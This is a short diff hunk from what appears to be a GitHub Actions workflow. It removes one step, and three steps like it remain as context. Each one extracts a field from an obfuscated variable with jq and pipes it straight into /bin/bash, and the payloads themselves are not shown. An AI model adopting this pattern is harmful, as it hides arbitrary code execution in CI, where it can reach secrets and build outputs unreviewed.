@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$v4698" | jq -r .kv4102 | /bin/bash
           echo $xu87614 | jq -r .cuqf75835 | /bin/bash
           printf '%s' "$ypnt6" | jq -r .nlx6604 | /bin/bash
-          printf '%s' "$oba79061" | jq -r .nqfl1 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
